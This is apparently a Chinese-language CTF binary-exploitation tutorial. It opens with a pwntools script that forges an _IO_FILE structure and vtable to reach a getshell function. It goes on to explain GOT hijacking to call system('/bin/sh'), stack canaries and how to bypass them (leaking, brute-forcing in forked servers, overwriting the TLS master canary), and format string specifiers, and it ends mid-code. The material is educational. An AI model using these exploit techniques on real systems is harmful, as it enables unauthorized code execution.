<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;&#x27;</span>, )</span><br><span class="line">elf = ELF(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 非 PIE 程序，直接获取符号地址</span></span><br><span class="line">buf_addr = elf.symbols[<span class="string">&#x27;buf&#x27;</span>]</span><br><span class="line">getshell_addr = elf.symbols[<span class="string">&#x27;getshell&#x27;</span>]</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">f&quot;Buf Address: <span class="subst">&#123;<span class="built_in">hex</span>(buf_addr)&#125;</span>&quot;</span>)</span><br><span class="line">log.info(<span class="string">f&quot;Getshell Address: <span class="subst">&#123;<span class="built_in">hex</span>(getshell_addr)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. 构造 _IO_FILE 结构体</span></span><br><span class="line">payload = p64(<span class="number">0xfbad208b</span>)             <span class="comment"># _flags</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 绕过 lock 检查 (Offset 0x88)</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x88</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(buf_addr + <span class="number">0x10</span>)       <span class="comment"># _lock 指向一块全零的地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 劫持 vtable 指针 (Offset 0xd8)</span></span><br><span class="line">fake_vtable_addr = buf_addr + <span class="number">0x100</span></span><br><span class="line">payload = payload.ljust(<span class="number">0xd8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(fake_vtable_addr)      <span class="comment"># vtable 指针</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. 布置伪造的虚函数表 (Offset 0x100)</span></span><br><span class="line"><span class="comment"># fclose 调用 vtable + 0x10 处的 _IO_FINISH</span></span><br><span class="line">vtable = p64(<span class="number">0</span>) * <span class="number">2</span>                   <span class="comment"># dummy</span></span><br><span class="line">vtable += p64(getshell_addr)          <span class="comment"># 目标函数</span></span><br><span class="line"></span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>) + vtable</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送 Payload 触发 getshell</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="劫持控制流-Control-Flow-Hijack"><a href="#劫持控制流-Control-Flow-Hijack" class="headerlink" title="劫持控制流/Control Flow Hijack"></a><strong>劫持控制流/Control Flow Hijack</strong></h3><p>劫持控制流（Control Flow Hijack）就是修改某个函数的<code>GOT</code>或者是<code>PLT</code>的内容。</p>
<p>由于<code>GOT</code>，<code>PLT</code>表的地址比栈的要低，所以无法通过栈溢出实现这种攻击，而是需要堆（Heap）上的溢出，或者是任意写入的漏洞。</p>
<p>我们来看一个简单的例子：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> BUFSIZE 0x20</span></span><br><span class="line"><span class="type">uint32_t</span> *<span class="built_in">array</span>;</span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)&#123;</span><br><span class="line">	<span class="built_in">array</span> = <span class="built_in">calloc</span>(<span class="number">20</span>, <span class="keyword">sizeof</span>(*<span class="built_in">array</span>));</span><br><span class="line">	<span class="comment">// ...</span></span><br><span class="line">	<span class="built_in">array</span>[i] = atoi(buf);</span><br><span class="line">	<span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>由于程序的漏洞，我们这里可以控制<code>i</code>和<code>buf</code>的内容。所以我们这里可以获得一个任意写入的权限。</p>
<p>假设我们通过其他办法得到了<code>system</code>函数的真实地址，那么我们就可以把<code>atoi@got</code>里的内容修改成<code>system</code>的地址，这样一来，当程序进行到<code>atoi</code>时，它会通过<code>plt</code>和<code>got</code>来调用<code>got</code>里写的函数地址，也就是<code>system</code>的地址。当我们再给<code>buf</code>输入<code>&quot;/bin/sh&quot;</code>的时候，程序执行原本的<code>atoi(buf)</code>时候实际上会执行<code>system(buf)</code>，由此拿到shell。</p>
<p>当程序没有循环的时候我们需要将程序结束前会调用的某个函数修改成<code>main</code>的地址，使得程序会循环运行<code>main</code>函数。</p>
<p><br></p>
<p><strong>简单来讲，劫持控制流就是修改程序的got表里的内容，使得程序以为自己在运行函数<code>fun1</code>的时候，实际上在运行<code>fun2</code>，依次来达到目的。</strong>这种操作相对于ROP来讲会更加间接一点。在之后堆利用的部分会经常用到。</p>
<h3 id="栈金丝雀-Stack-Canary"><a href="#栈金丝雀-Stack-Canary" class="headerlink" title="栈金丝雀/Stack Canary"></a><strong>栈金丝雀/Stack Canary</strong></h3><p>为了预防潜在的栈溢出的威胁，人们发明了名为Stack Canary（栈金丝雀）的安全机制。</p>
<p><strong>名字的由来/历史背景：</strong></p>
<p>在 19 世纪和 20 世纪早期，还没有先进的电子传感器。矿工下井挖掘煤矿时，最害怕的就是无色无味的一氧化碳 (CO)或瓦斯(甲烷)泄漏。一旦发现，通常为时已晚。</p>
<p>矿工们发现，金丝雀（Canary）这种鸟类对有毒气体极其敏感。由于它们的新陈代谢很快，只要空气中有一丁点毒气，金丝雀会比人类更早出现中毒反应（停止歌唱、晕倒甚至死亡）。</p>
<p>因此，矿工下井时会提着一个装着金丝雀的笼子，类似于一个警报器：</p>
<ul>
<li>只要鸟还在叫，说明环境是安全的。</li>
<li>一旦鸟不叫了或倒下了，矿工就知道危险逼近，必须立即撤离。</li>
</ul>
<p><br></p>
<p>回到计算机的部分：</p>
<p>Stack Canary（栈金丝雀）的核心思想非常简单：<strong>在局部变量（缓冲区）和控制信息（如返回地址）之间放置一个随机生成的整数（即 Canary）。</strong></p>
<p><strong>在函数返回之前，系统会检查这个值是否被修改。</strong>如果发生了缓冲区溢出，攻击者的数据通常是从低地址向高地址覆盖的，那么在覆盖到返回地址之前，必然会先覆盖掉 Canary。一旦系统发现 Canary 变了，就会立即终止程序，从而阻止攻击。</p>
<p>比较有意思的是，我们可以做一个完美的对应（类似比喻的那种）：</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>现实世界 (煤矿)</th>
<th>计算机世界 (内存栈)</th>
</tr>
</thead>
<tbody>
<tr>
<td>矿井</td>
<td>程序栈 (Stack)</td>
</tr>
<tr>
<td>矿工</td>
<td>返回地址 (Return Address)</td>
</tr>
<tr>
<td>毒气/瓦斯</td>
<td>缓冲区溢出数据 (Buffer Overflow)</td>
</tr>
<tr>
<td>金丝雀 (Canary)</td>
<td>Canary值 (随机整数)</td>
</tr>
<tr>
<td>鸟死了</td>
<td>Canary值被修改</td>
</tr>
<tr>
<td>撤离矿井</td>
<td>程序终止</td>
</tr>
</tbody>
</table>
</div>
<p><strong>开启了canary的栈布局：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">高地址 (High Address) 0xFF...</span><br><span class="line">            ^</span><br><span class="line">            |</span><br><span class="line">+-----------------------+</span><br><span class="line">|                       |</span><br><span class="line">|    Return Address     |  &lt;-- 返回地址</span><br><span class="line">|      (RIP / EIP)      |</span><br><span class="line">|                       |</span><br><span class="line">+-----------------------+</span><br><span class="line">|                       |</span><br><span class="line">|   Saved Frame Pointer |  (保存的基址指针，如 EBP/RBP)</span><br><span class="line">|                       |</span><br><span class="line">+-----------------------+</span><br><span class="line">|                       |</span><br><span class="line">|      Stack Canary     |  &lt;-- Canary</span><br><span class="line">|         随机值         |</span><br><span class="line">|                       |</span><br><span class="line">+-----------------------+</span><br><span class="line">|                       |</span><br><span class="line">|                       |</span><br><span class="line">|    Local Variables    |  &lt;-- [溢出源头] buf</span><br><span class="line">|    (Buffer / Array)   |</span><br><span class="line">|                       |</span><br><span class="line">|                       |</span><br><span class="line">+-----------------------+</span><br><span class="line">            |</span><br><span class="line">            v</span><br><span class="line">低地址 (Low Address) 0x00...</span><br></pre></td></tr></table></figure>
<p>此外还有一点，在 Linux (GCC/glibc) 以及大多数现代操作系统的实现中，x86/x64架构下的Stack Canary的<strong>最低位（Least Significant Byte, LSB）</strong> 几乎总是被强制设置为<strong><code>0x00</code></strong>。</p>
<p>（因为x86/x64是小端序 (Little-Endian) 架构，所以最低位会被存在低地址，也就是上面结构里离局部变量最近的那位。）</p>
<p>这个 <code>0x00</code> 主要有两个防御目的，特别是针对 C 语言中常见的字符串操作函数：</p>
<ol>
<li><strong>防止泄漏 (Anti-Leak / Read Protection)</strong><ul>
<li>C 语言的字符串打印函数（如 <code>printf(&quot;%s&quot;, buf)</code>, <code>puts(buf)</code>）是依靠 <code>\0</code> (0x00) 来判断字符串结束的。</li>
<li>如果攻击者利用漏洞读取栈上的内容（例如 buffer 没有正确的结束符），程序会一直向高地址打印。</li>
<li>当打印遇到Canary的第一个字节 <code>0x00</code> 时，打印函数会认为“字符串结束了”，立即停止。</li>
<li>也就是说：我们只能读到填充的垃圾数据，而读不到 Canary 后面的 7 个<strong>随机字节</strong>。保护了 Canary 的秘密性。</li>
</ul>
</li>
<li><strong>防止特定写入 (Anti-Overwrite / Write Protection)</strong><ul>
<li>字符串复制函数（如 <code>strcpy</code>）遇到<code>0x00</code>会停止复制。</li>
<li>虽然这不能完全阻止缓冲区溢出（仍可以用 <code>memcpy</code> 或 <code>read</code> 这种不看 <code>\0</code> 的函数来覆盖），但它限制了攻击者使用<code>strcpy</code>这类函数来精准修改Canary之后的返回地址而不破坏 Canary的难度。</li>
</ul>
</li>
</ol>
<p><br></p>
<p>栈金丝雀可以非常有效地防御那种连续性的overflow漏洞/<strong>线性溢出</strong>（Linear Overflow），但是仍有些情况它是照顾不到的：</p>
<p>1. 假如有<strong>信息泄露漏洞</strong>（比如 Format String 漏洞，或者可以越界读取 Stack 内容），那么我们就可以直接把canary的完整的值泄露出来，覆写时注意把canary部分覆写成正确的值即可。</p>
<p><br></p>
<p>2. 假如有<strong>数组越界写入漏洞（Out-of-Bound Write）</strong>，那么就可以指定索引写入，从而直接绕过canary来修改返回地址等内容。</p>
<p><br></p>
<p>3. 假如<strong>常驻主程序使用<code>fork()</code>来生成子进程</strong>处理每个连接，并处理所有逻辑，那么就可以尝试爆破canary的值。</p>
<p><strong><code>fork()</code> 不会重新随机化 canary</strong>：父进程的 TLS/TCB（存 canary 的地方）会COW（copy on write）复制给子进程。</p>
<p>所以<strong>所有子进程的 canary 都一样</strong>（直到父进程重启）。也就是说，<strong>每次连接的时候，canary的值都一样。</strong></p>
<p>除此之外，进程在 <strong>exec</strong> 时才做一次 ASLR 随机化：PIE 基址、libc 基址、栈基址、canary 等都在这时确定。</p>
<p>并且<strong><code>fork()</code> 不会重新随机化地址空间</strong>，而是把父进程当前的内存映射按COW（copy on write）原样克隆给子进程。</p>
<p>因此，同一轮服务存活期间，所有子进程都会<strong>共享这些不变的东西</strong>：</p>
<ul>
<li><strong>stack canary 值</strong>（最低字节 0x00），</li>
<li><strong>PIE / libc 的装载基址</strong>（所以代码里的绝对返回地址一致），</li>
<li><strong>栈/堆/各段的虚拟地址布局</strong>（所以函数帧的 <strong>saved RBP</strong> 和 <strong>RET</strong> 会落在<strong>相同的虚拟地址</strong>，并且内容一致：<ul>
<li><code>saved rbp</code> 是上个帧的栈地址；</li>
<li><code>ret</code> 是固定的“调用点下一条指令”的地址。<br>调用序列相同 → 它们在每个子进程里都相同。）</li>
</ul>
</li>
</ul>
<p>所以说在这种情况下，我们可以根据Orcacle来一位一位地爆破canary的值：一位一位地覆盖canary的值，根据程序是否有正常执行之后的内容来判断尝试是否正确。</p>
<p><br></p>
<p>4. <strong>主线程生成了一个子线程来处理所有的逻辑。</strong></p>
<p>在Linux (glibc) x86_64环境下：</p>
<ul>
<li><strong>主线程</strong>：栈（Stack）和 TLS（Thread Local Storage）通常在内存中相距甚远。栈在极高的内存地址向下增长，而 TLS 位于加载的库附近。</li>
<li><strong>子线程 (pthread)</strong>：<strong>栈和 TLS 是紧邻的</strong>。<code>pthread_create</code> 会使用 <code>mmap</code> 分配一块连续的内存区域作为该线程的栈空间。</li>
</ul>
<p>内存视图：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">高地址 (High Address)</span><br><span class="line">+-------------------------+</span><br><span class="line">|        TLS / TCB        | (线程控制块)</span><br><span class="line">| ----------------------- |</span><br><span class="line">|           ...           |</span><br><span class="line">|   stack_guard (Master)  | &lt;-- 真正的金丝雀值 (fs:0x28)</span><br><span class="line">|           ...           |</span><br><span class="line">|        tcbhead_t        |</span><br><span class="line">+-------------------------+ &lt;--- Stack Base (初始栈顶指针 SP)</span><br><span class="line">|           ...           |</span><br><span class="line">|     Previous Frames     | (更早的函数栈帧)</span><br><span class="line">|           ...           |</span><br><span class="line">+-------------------------+</span><br><span class="line">|      Return Address     | &lt;-- 想要覆盖掉的返回地址</span><br><span class="line">+-------------------------+</span><br><span class="line">|     [ Stack Canary ]    | &lt;-- (当前函数的金丝雀)</span><br><span class="line">+-------------------------+</span><br><span class="line">|         [ buf ]         | &lt;-- 溢出点</span><br><span class="line">|                         |</span><br><span class="line">|                         |</span><br><span class="line">|                         |</span><br><span class="line">|            ^            |</span><br><span class="line">|            |            | (栈空间)</span><br><span class="line">|          Stack          |</span><br><span class="line">|                         |</span><br><span class="line">+-------------------------+ &lt;--- Stack Limit (当前栈底)</span><br><span class="line">|       Guard Page        | (保护页，触碰即导致段错误)</span><br><span class="line">+-------------------------+</span><br><span class="line">低地址 (Low Address)</span><br></pre></td></tr></table></figure>
<p>程序退出时，会将栈里的canary值与master canary的值进行比较，如果不一样就会直接退出。</p>
<p>所以如果可以<strong>同时覆盖掉栈里的canary和TLS中的master canary</strong>，便可以绕过canary的检测进行任意的ROP。</p>
<p>注意：大部分指针只接受valid的值或者是<code>null</code>，所以在这种需要覆盖很多内容的情况时需要格外注意。（需要一点一点debug，非常折磨）</p>
<h2 id="格式化字符串漏洞-Format-String-Vulnerability"><a href="#格式化字符串漏洞-Format-String-Vulnerability" class="headerlink" title="格式化字符串漏洞 Format String Vulnerability"></a><strong>格式化字符串漏洞 Format String Vulnerability</strong></h2><p>我们首先来看一下什么是格式化字符串函数。</p>
<h3 id="格式化字符串函数"><a href="#格式化字符串函数" class="headerlink" title="格式化字符串函数"></a><strong>格式化字符串函数</strong></h3><p>格式化字符串（ format string）函数可以接受可变数量的参数，并将<strong>第一个参数作为格式化字符串，根据其来解析之后的参数</strong>。</p>
<p>可以参考这个定义：</p>
<p>The format string is a character string which contains two types of objects: plain characters, which are simply copied to the output channel, and conversion specifications, each of which causes conversion and printing of arguments.</p>
<p>（来源：<a target="_blank" rel="noopener" href="https://ocaml.org/manual/5.0/api/Printf.html）">https://ocaml.org/manual/5.0/api/Printf.html）</a></p>
<p>一般来说，格式化字符串在利用的时候主要分为三个部分</p>
<ul>
<li>格式化字符串函数</li>
<li>格式化字符串</li>
<li>变量，<strong>可选</strong></li>
</ul>
<p>例子：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">10</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, i);  <span class="comment">// %d是输出控制符，d 表示十进制，后面的 i 是输出参数*</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="格式化字符串函数-1"><a href="#格式化字符串函数-1" class="headerlink" title="格式化字符串函数"></a><strong>格式化字符串函数</strong></h4><p>分为输入和输出，其中</p>
<p>- <strong>输入</strong>：</p>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">函数</th>
<th style="text-align:center">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>scanf()</code></td>
<td style="text-align:center">从标准输入读取数据</td>
</tr>
</tbody>
</table>
</div>
<p>基本语法：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;格式字符串&quot;</span>, &amp;变量<span class="number">1</span>, &amp;变量<span class="number">2</span>, ...);</span><br></pre></td></tr></table></figure>
<p>例子：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> age;</span><br><span class="line">	<span class="type">float</span> height;</span><br><span class="line">    <span class="type">char</span> name[<span class="number">20</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %f %s&quot;</span>, &amp;age, &amp;height, name);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>注意：<code>scanf(&quot;%s&quot;, name);</code> 不需要加 <code>&amp;</code>，因为数组名本身就是地址。</p>
<p>- <strong>输出</strong>：</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>函数名</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>printf</code></td>
<td>向标准输出（通常是终端）打印格式化字符串</td>
</tr>
<tr>
<td><code>fprintf</code></td>
<td>向指定文件流打印格式化字符串（如 <code>stderr</code>, 文件指针等）</td>
</tr>
<tr>
<td><code>sprintf</code></td>
<td>将格式化的字符串写入字符数组（注意缓冲区溢出风险）</td>
</tr>
<tr>
<td><code>snprintf</code></td>
<td>将格式化的字符串写入字符数组，指定最大写入长度，<strong>更安全</strong></td>
</tr>
<tr>
<td><code>asprintf</code></td>
<td>将格式化字符串写入动态分配的内存（GNU 扩展，非标准 C）</td>
</tr>
<tr>
<td><code>dprintf</code></td>
<td>向指定的文件描述符写入格式化字符串（POSIX，常用于系统编程）</td>
</tr>
<tr>
<td><code>vprintf</code></td>
<td>类似 <code>printf</code>，但参数通过 <code>va_list</code> 传递（用于变参函数）</td>
</tr>
<tr>
<td><code>vfprintf</code></td>
<td>类似 <code>fprintf</code>，参数为 <code>va_list</code></td>
</tr>
<tr>
<td><code>vsprintf</code></td>
<td>类似 <code>sprintf</code>，参数为 <code>va_list</code>（不安全）</td>
</tr>
<tr>
<td><code>vsnprintf</code></td>
<td>类似 <code>snprintf</code>，参数为 <code>va_list</code>（推荐用于变参安全格式化）</td>
</tr>
</tbody>
</table>
</div>
<h4 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a><strong>格式化字符串</strong></h4><p>正如上面的定义里说的，格式化字符串里除了明文还有格式化占位符。我们这里来重点关注一下这个格式化占位符。</p>
<p><strong>格式化占位符（conversion specifications）</strong>的语法如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%[parameter][flags][field width][.precision][length]type</span><br></pre></td></tr></table></figure>
<p>- <strong>Parameter</strong>：指定用于格式化的参数位置（从1开始）</p>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">字符</th>
<th style="text-align:center">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>n$</code></td>
<td style="text-align:center">其中<code>n</code>是参数位置</td>
</tr>
</tbody>
</table>
</div>
<p>例子：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%2$d %1$d&quot;</span>, <span class="number">11</span>, <span class="number">22</span>);</span><br><span class="line"><span class="comment">// 会输出 22 11</span></span><br></pre></td></tr></table></figure>
<p>- <strong>Flags</strong>：</p>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">标志</th>
<th style="text-align:center">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>-</code></td>
<td style="text-align:center">左对齐（默认是右对齐）</td>
</tr>
<tr>
<td style="text-align:center"><code>+</code></td>
<td style="text-align:center">总是显示正号或负号（例如 +10）</td>
</tr>
<tr>
<td style="text-align:center"><code> </code>(空格)</td>
<td style="text-align:center">正数前加空格，负数前加负号</td>
</tr>
<tr>
<td style="text-align:center"><code>0</code></td>
<td style="text-align:center">用0填充未占满的宽度</td>
</tr>
<tr>
<td style="text-align:center"><code>#</code></td>
<td style="text-align:center">对于<code>%o</code>、<code>%x</code>、<code>%X</code>等，添加前缀（如<code>0x</code>）；对于<code>%f</code>等，始终包含小数点</td>
</tr>
</tbody>
</table>
</div>
<p>- <strong>Field Width</strong>：指定最小输出字符数，不足时用空格（或<code>0</code>）填充，如果要使用变量指定宽度，可以用 <code>*</code>。</p>
<p>例子：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, <span class="number">42</span>);</span><br><span class="line"><span class="comment">// 会输出 &quot;   42&quot; （前面有3个空格）</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%*d&quot;</span>, <span class="number">5</span>, <span class="number">42</span>);</span><br><span class="line"><span class="comment">// 会输出 &quot;   42&quot; （前面有3个空格）</span></span><br></pre></td></tr></table></figure>
<p>- <strong>Precision</strong>：指定数字小数点后的位数或字符串的最大输出长度：</p>
<ul>
<li>对于浮点数（如 <code>%f</code>）：表示小数点后保留的位数，如 <code>%.2f</code></li>
<li>对于字符串（如 <code>%s</code>）：表示最大输出字符数，如 <code>%.5s</code></li>
<li>可以使用 <code>*</code> 表示由参数动态提供</li>
</ul>
<p>- <strong>Length</strong>：指出浮点型参数或整型参数的长度</p>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">修饰符</th>
<th style="text-align:center">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>hh</code></td>
<td style="text-align:center"><code>signed char</code> 或 <code>unsigned char</code></td>
</tr>
<tr>
<td style="text-align:center"><code>h</code></td>
<td style="text-align:center"><code>short</code> 或 <code>unsigned short</code></td>
</tr>
<tr>
<td style="text-align:center"><code>l</code></td>
<td style="text-align:center"><code>long</code> 或 <code>unsigned long</code></td>
</tr>
<tr>
<td style="text-align:center"><code>ll</code></td>
<td style="text-align:center"><code>long long</code> 或 <code>unsigned long long</code></td>
</tr>
<tr>
<td style="text-align:center"><code>L</code></td>
<td style="text-align:center"><code>long double</code>（用于<code>%Lf</code>）</td>
</tr>
<tr>
<td style="text-align:center"><code>z</code></td>
<td style="text-align:center"><code>size_t</code></td>
</tr>
<tr>
<td style="text-align:center"><code>t</code></td>
<td style="text-align:center"><code>ptrdiff_t</code></td>
</tr>
<tr>
<td style="text-align:center"><code>j</code></td>
<td style="text-align:center"><code>intmax_t</code> 或 <code>uintmax_t</code></td>
</tr>
</tbody>
</table>
</div>
<p>例子：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">signed</span> <span class="type">char</span> a = <span class="number">-5</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%hhd\n&quot;</span>, a);</span><br><span class="line">    <span class="comment">// 会输出 &quot;-5&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="type">short</span> s = <span class="number">32000</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%hd\n&quot;</span>, s);</span><br><span class="line">    <span class="comment">// 会输出 &quot;32000&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="type">long</span> l = <span class="number">123456789L</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%ld\n&quot;</span>, l);</span><br><span class="line">    <span class="comment">// 会输出 &quot;123456789&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> ll = <span class="number">9223372036854775807LL</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>, ll);</span><br><span class="line">    <span class="comment">// 会输出 &quot;9223372036854775807&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="type">long</span> <span class="type">double</span> ld = <span class="number">3.141592653589793238L</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%Lf\n&quot;</span>, ld);</span><br><span class="line">    <span class="comment">// 会输出 &quot;3.141593&quot;（默认保留6位小数）</span></span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> sz = <span class="number">100</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%zu\n&quot;</span>, sz);</span><br><span class="line">    <span class="comment">// 会输出 &quot;100&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="type">ptrdiff_t</span> diff = <span class="number">-8</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%td\n&quot;</span>, diff);</span><br><span class="line">    <span class="comment">// 会输出 &quot;-8&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="type">intmax_t</span> im = <span class="number">9223372036854775807</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span 